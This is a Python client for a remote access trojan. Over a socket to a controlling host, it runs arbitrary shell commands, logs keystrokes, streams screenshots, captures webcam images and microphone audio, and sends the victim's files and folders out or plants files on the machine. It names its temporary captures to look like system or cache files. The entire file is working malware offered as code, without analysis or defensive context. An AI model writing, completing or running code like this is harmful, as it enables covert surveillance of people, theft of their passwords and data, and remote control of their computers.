import socket
import os
import subprocess
import time
import cv2
import numpy as np
from pynput.keyboard import Key, Listener
import threading
import pyautogui
import pyscreenshot as ImageGrab
import tempfile
import sounddevice as sd
from scipy.io.wavfile import write
import pyaudio
import wave
import keylog_sort

def print2(text):
    print(text)



def listall(list_path):
    all_folders = []
    all_files = []
    for root,folders,files in os.walk(list_path):
    
        for eachfold in folders:
            all_folders.append(root.replace("\\","/")+"/"+eachfold.replace("\\","/"))
    
        for eachfile in files:
            all_files.append(os.path.join(root,eachfile))
            print2(eachfile)
    
    return all_folders, all_files
        
def text_send(s,text):
    s.send(bytes(str(text), "utf-8"))


global pressed_keys
pressed_keys = ""



def on_press(key):
    global pressed_keys
    #print2("{0} pressed".format(key))
    pressed_keys = pressed_keys + str(key)
    

def on_release(key):
    global killed
    try:
        if killed == True:
            return False
    except:
        pass

def start_keylogger():
    global pressed_keys
    with Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass
# keylogger_process = multiprocessing.Process(target=start_keylogger)
# keylogger_process.start()

def screencapture_connect(hostname):
    try:
        screenshare_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        screenshare_sock.connect((hostname, 31205))
        start_screencapture(screenshare_sock)
    except:
        # webcam_connect(hostname)
        pass

def start_screencapture(screenshare_sock):
    
 
        while True:
            filename = "lol.png"
            filename = os.path.join(tempfile.gettempdir(), filename)
            take_screenshot(filename)
            print2("screenshot saved")
            screenshare_sock.send(bytes(filename, "utf-8"))
            screenshare_sock.recv(4)
            with open(filename, "rb") as f:
                print2("opened file")
                screenshare_sock.send(bytes(str(os.path.getsize(filename)), "utf-8"))  
                print2("sent filesize")
                print2(screenshare_sock.recv(4).decode("utf-8"))
                l = f.read(1024)
                screenshare_sock.send(l)
                while l != b'':
                    l = f.read(1024)
                    screenshare_sock.send(l) 
            screenshare_sock.recv(4)
            screenshare_sock.send(bytes("ok", "utf-8"))
            screenshare_sock.recv(4)
            os.remove(filename)
   

        
def take_screenshot(filename):
    pyautogui.screenshot(filename)

def webcam_connect(hostname):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((hostname, 31207))
        webcam(s)
    except:
        # webcam_connect(hostname)
        pass

def webcam(s,cmd):
        try:
            cam = cv2.VideoCapture(0)
            while True:
                lol = s.recv(8).decode("utf-8")
                if lol == "continue":
                    
                    webcam_snap(s,cam,cmd)
                    if "webcam snap" in cmd:
                        cam.release()
                        break
                else:
                    cam.release()
            
    
        except:
            cam.release()
            print2("here")
            s.send(bytes("stopped", "utf-8")) 
            print2(s.recv(4).decode("utf-8") + "1")  

        cam.release()

def webcam_snap(s,cam,cmd):
    img = cam_get(cam, cmd)
    filename = "sys_21317412_dlocale.png"
    filename = os.path.join(tempfile.gettempdir(), filename)
    cv2.imwrite(filename, img)


    with open(filename, "rb") as f:
        s.send(bytes("file //" + str(os.path.getsize(filename)), "utf-8"))
        
        second_lol = s.recv(4).decode("utf-8")
        print2(second_lol + "yoo")
        if second_lol == "ok":
            l = f.read(1024)
            s.send(l)
        
            print2("here 21")    
            while l != b'':
                l = f.read(1024)
                s.send(l)
                print2("here 22")

    os.remove(filename)
    print2("got out from there 1")
    f.close()
    lol2 = s.recv(1024).decode("utf-8")

def cam_get(cam,cmd):
    try:
        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
        cam.set(cv2.CAP_PROP_FPS, 60)
    except:
        pass
    ret_val, img = cam.read()
    if "webcam snap" in cmd:
        cam.release()
    return img

def download(cmd, s):
    filename = cmd.replace("download ", "")
    if os.path.isfile(filename):

        with open(filename, "rb") as f:
            s.send(
                bytes("file //" + str(os.path.getsize(filename)), "utf-8"))

            print(s.recv(4).decode("utf-8"))
            l = f.read(1024)
            s.send(l)
            while l != b'':
                l = f.read(1024)
                s.send(l)

        f.close()

        print(s.recv(buffer).decode("utf-8"))
    else:
        s.send(bytes("folder //", "utf-8"))
        s.recv(4)
        all_folders, all_files = listall(
            cmd.replace("upload ", ""))
        s.send(bytes(str(len(all_folders)), "utf-8"))
        s.recv(4)
        for a in all_folders:
            print(a)
            a = "\"" + a + "\""
            s.send(bytes(a, "utf-8"))
            s.recv(4)

        s.send(bytes(str(len(all_files)), "utf-8"))
        s.recv(4)

        for a in all_files:
            print("went to for loop")
            s.send(bytes(a.replace("\\", "/"), "utf-8"))
            print("sent filename" + a)

            print("recieved " + s.recv(4).decode("utf-8"))

            with open(a, "rb") as f:
                s.send(bytes(str(os.path.getsize(a)), "utf-8"))
                print("sent file size")

                print("recieved " + s.recv(4).decode("utf-8"))

                l = f.read(1024)
                s.send(l)
                print("sending data")
                print("recieved " + s.recv(4).decode("utf-8"))
                print("going inside while loop")
                while l != b'':
                    print(l)
                    print("went inside while loop")
                    l = f.read(1024)
                    print("sending data")
                    s.send(l)
                    print("sent data")
                    s.recv(4)

            f.close()
            s.recv(1024)

def shell(cmd):
    subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

def record_audio(s, duration):
    fs = 44100  # this is the frequency sampling; also: 4999, 64000
    seconds = duration  # Duration of recording

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
 
    sd.wait()  # Wait until recording is finished
    filename = "mediacache.wav"
    filename = os.path.join(tempfile.gettempdir(), filename)
    write(filename, fs, myrecording)  # Save as WAV file
    
    s.send(bytes(filename, "utf-8"))
    s.recv(4)
    with open(filename, "rb") as f:
        print2("opened file")
        s.send(bytes(str(os.path.getsize(filename)), "utf-8"))  
        print2("sent filesize")
        print2(s.recv(4).decode("utf-8"))
        l = f.read(1024)
        s.send(l)
        while l != b'':
            l = f.read(1024)
            s.send(l) 
    s.recv(4)

    os.remove(filename)

def record_audio2(s,duration):
    filename = "mediacache2.wav"
    filename = os.path.join(tempfile.gettempdir(), filename)
    # set the chunk size of 1024 samples
    chunk = 1024
    # sample format
    FORMAT = pyaudio.paInt16
    # mono, change to 2 if you want stereo
    channels = 1
    # 44100 samples per second
    sample_rate = 4999
    record_seconds = duration
    # initialize PyAudio object
    p = pyaudio.PyAudio()
    # open stream object as input & output
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    frames = []
    
    for i in range(int(sample_rate / chunk * record_seconds)):
        data = stream.read(chunk)
        # if you want to hear your voice while recording
        # stream.write(data)
        frames.append(data)
    # stop and close stream
    stream.stop_stream()
    stream.close()
    # terminate pyaudio object
    p.terminate()
    # save audio file
    # open the file in 'write bytes' mode
    wf = wave.open(filename, "wb")
    # set the channels
    wf.setnchannels(channels)
    # set the sample format
    wf.setsampwidth(p.get_sample_size(FORMAT))
    # set the sample rate
    wf.setframerate(sample_rate)
    # write the frames as bytes
    wf.writeframes(b"".join(frames))
    # close the file
    wf.close()

    s.send(bytes(filename, "utf-8"))
    s.recv(4)
    with open(filename, "rb") as f:
        print2("opened file")
        s.send(bytes(str(os.path.getsize(filename)), "utf-8"))  
        print2("sent filesize")
        print2(s.recv(4).decode("utf-8"))
        l = f.read(1024)
        s.send(l)
        while l != b'':
            l = f.read(1024)
            s.send(l) 
    s.recv(4)

def advanced_client(s, hostname):
    
    global killed
    killed = False
    buffer = 1024
    while True:
        output = "nothing"     
        
        msg = s.recv(buffer)
        cmd = msg.decode("utf-8") 

        if "del" in cmd:
                hi = subprocess.Popen("dir", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output = hi.stderr.read().decode("utf-8")
                output = output + hi.stdout.read().decode("utf-8")

        if cmd.startswith("cat ") or cmd.startswith("download ") or cmd.startswith("type "):
            try:
                buffer = os.stat(cmd.replace("cat ","")).st_size + 1024
            except:
                try:
                    buffer = os.stat(cmd.replace("download ","")).st_size + 1024
                except:
                    buffer = os.stat(cmd.replace("type ","")).st_size + 1024
            s.send(bytes("New buffer = " + str(buffer), "utf-8"))

        else:
            pass

        if cmd == "restart":
            raise ValueError("lol")
            
        
        elif cmd.startswith("cd "):
            try:
                os.chdir(cmd.split("cd ")[1].replace("\\ "," "))
            
            except:
                output = "FileNotFoundError: [Errno 2] No such file or directory: " + cmd.split("cd ")[1]
        elif cmd.startswith("download "):
            filename = cmd.replace("download ","")
            if os.path.isfile(filename):
            
                with open(filename, "rb") as f:
                    s.send(bytes("file //" + str(os.path.getsize(filename)), "utf-8"))
                    
                    print2(s.recv(4).decode("utf-8"))
                    l = f.read(1024)
                    s.send(l)
                    while l != b'':
                        l = f.read(1024)
                        s.send(l)  
                    
                f.close()
                
                print2(s.recv(buffer).decode("utf-8"))
            else:
                s.send(bytes("folder //", "utf-8"))
                s.recv(4)
                all_folders, all_files = listall(cmd.replace("download ",""))
                s.send(bytes(str(len(all_folders)), "utf-8"))
                s.recv(4)
                for a in all_folders:
                    print2(a)
                    a = "\"" + a + "\""
                    s.send(bytes(a, "utf-8"))
                    s.recv(4)

                    
                s.send(bytes(str(len(all_files)),"utf-8"))
                s.recv(4)
                
                for a in all_files:
                    print2("went to for loop")
                    s.send(bytes(a.replace("\\","/"), "utf-8"))
                    print2("sent filename" + a)
                    
                    print2("recieved " + s.recv(4).decode("utf-8"))
                    
                    with open(a, "rb") as f:
                        s.send(bytes(str(os.path.getsize(a)),"utf-8"))
                        print2("sent file size")
                        

                        print2("recieved "+ s.recv(4).decode("utf-8"))
                        
                        l = f.read(1024)
                        s.send(l)
                        print2("sending data")
                        print2("recieved " +s.recv(4).decode("utf-8"))
                        print2("going inside while loop")
                        while l != b'':
                            print2(l)
                            print2("went inside while loop")
                            l = f.read(1024)
                            print2("sending data")
                            s.send(l)
                            print2("sent data")
                            s.recv(4)  
                            
                    
                    f.close()
                    s.recv(1024)
        elif cmd.startswith("upload "):
            d_typa_file = s.recv(32).decode("utf-8")
            if d_typa_file.startswith("file //"):
                s.send(bytes("ok", "utf-8"))
                filesize = int(d_typa_file.replace("file //",""))
                with open(cmd.replace("upload ",""), "wb") as f:
                    starting_time = time.time()
                    data = s.recv(1024)
                    totalr = len(data)
                    f.write(data)
                    while totalr < filesize:
                        data = s.recv(1024)
                        totalr += len(data)
                        f.write(data)
             
           
           
                f.close()
            
                s.send(bytes("File uploaded: " + cmd.replace("upload ",""), "utf-8"))
            elif d_typa_file.startswith("folder //"):
                print2("---- Starting to create folders ----- ")
                text_send(s,"ok")
                
                length_of_fold = s.recv(1024)
                
                text_send(s,"ok")
                os.system("mkdir " + cmd.replace("upload ","").replace(" ","\ "))
                print2("mkdir " + cmd.replace("upload ",""))
                for a in range(0, int(length_of_fold)):
                    
                    foldername = s.recv(1024).decode("utf-8")
                    print2(os.system("mkdir " + foldername))
                    os.system("mkdir " + foldername.replace(" ","\ "))
                    text_send(s,"ok")

                print2("---- Starting to recieve files -----")
                length_of_files = s.recv(1024).decode("utf-8")
                print2("recieved number of files" + str(length_of_files))

                text_send(s,"ok")
                print2("Sent ok")
                for a in range(0,int(length_of_files)):

                    filename = s.recv(1024).decode("utf-8")
                    print2("Recieved filename as " + str(filename))
                    text_send(s,"ok")
                    print2("Sent ok")
                
                    filesize = s.recv(1024)
                    filesize = filesize.decode("utf-8")
                    print2("recieved file size" + filesize)
                    
                    text_send(s,"ok")
                    print2("Sent ok")
                
                    filesize = int(filesize)
                    
                    with open(filename, "wb") as f:
                        print2("Opned file")
                        starting_time = time.time()
                        print2("started recieveing file")
                        data = s.recv(1024)
                        print2("recieved first parts")
                        text_send(s,"ok")
                        print2("sent ok")
                        totalr = len(data)
                        f.write(data)
                        print2("going inside while loop")
                        while totalr < filesize:
                            print2("inside while loop")
                            data = s.recv(1024)
                            print2("recieved 1024 bytes")
                            text_send(s,"ok")
                            print2("sent ok")
                            totalr += len(data)
                            f.write(data)
                            speed_divider = 1
                            speed_unit = " bytes"
                            speed_bytes = totalr/(time.time() - starting_time)
                            if speed_bytes > 1000:
                                speed_divider = 1000
                                speed_unit = " kbps"
                                if speed_bytes > 1000000:
                                    speed_divider = 1000000
                                    speed_unit = " mbps"
                                    if speed_bytes > 1000000000:
                                        speed_divider = 1000000000
                                        speed_unit = " gbps"
                            speed = str((speed_bytes/speed_divider))[:5]
                            print2(str(totalr)+"/"+str(filesize))
                            #print2(str(totalr) + "/" + str(filesize) + " /// " + speed + speed_unit)
                    f.close()
                    s.send(bytes("File uploaded: " + cmd.replace("upload ",""), "utf-8"))
        elif cmd.startswith("set "):
            if cmd.replace("set ", "").startswith("buffer "):
                try:
                    buffer = int(cmd.replace("set buffer ",""))
                    output = "Buffer has been set in client"
                except:
                    output = "Buffer has failed to set in client"
                output = output + "\n ---- Current Buffer " + str(buffer)

        elif cmd == "buffer":
            output = "Buffer check from client " + str(buffer)
        elif cmd == "clear" or cmd == "cls":
            output = "Screen cleared"
        elif cmd.startswith("webcam"):
          
                webcam(s,cmd)

        elif "keylog" in cmd :
            global pressed_keys
            if cmd == "keylog dump":
               
                
                if pressed_keys == "" or pressed_keys == None:
                    output = "no logged"
                else:
                    output = pressed_keys
                    output = output.replace("'","")
                    output = output.replace("Key.space", " ")
                    output = output.replace("Key.backspace", " backspace ")
                    output = keylog_sort.sort(output)
            elif cmd == "keylog dump 2":
              
                if pressed_keys == "" or pressed_keys == None:
                    output = "no logged"
                else:
                    output = pressed_keys
            elif cmd == "keylog start":
                keylogger_thread = threading.Thread(target=start_keylogger)
                keylogger_thread.start()
            elif cmd == "keylog clean":
                pressed_keys = ""
                output = "cleaned"
    
        elif cmd == "screenshot":
            filename = os.path.join(tempfile.gettempdir(), str(time.time()) + ".jpg")
            
            take_screenshot(filename)
            print2("screenshot saved")
            s.send(bytes(filename, "utf-8"))
            s.recv(4)
            with open(filename, "rb") as f:
                print2("opened file")
                s.send(bytes(str(os.path.getsize(filename)), "utf-8"))  
                print2("sent filesize")
                print2(s.recv(4).decode("utf-8"))
                l = f.read(1024)
                s.send(l)
                while l != b'':
                    l = f.read(1024)
                    s.send(l) 
            s.recv(4)
            s.send(bytes("done", "utf-8"))
            os.remove(filename)
        elif "audio " in cmd and "audio2 " not in cmd:
          
            duration = cmd.replace("audio ","")
           
       
            duration = int(duration)
            
            record_audio(s, duration)
        
            output = "sent"
       
        elif "audio2 " in cmd:
          
            duration = cmd.replace("audio2 ","")
           
         
            duration = int(duration)
            
            record_audio2(s, duration)
        
            output = "sent"
         
        
        elif cmd == "start screencapture":
            start_screencapture(s)
    
       
        else:
        
            try:
                hi = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output = hi.stderr.read().decode("utf-8")
                output = output + hi.stdout.read().decode("utf-8")
                
            except:
                output = "error"
        cwd = str(os.getcwd())
        s.send(bytes(str((output + ' /loc_split/ ' + cwd).__sizeof__()), "utf-8"))
        s.recv(4)
        s.send(bytes(output + ' /loc_split/ ' + cwd,"utf-8"))
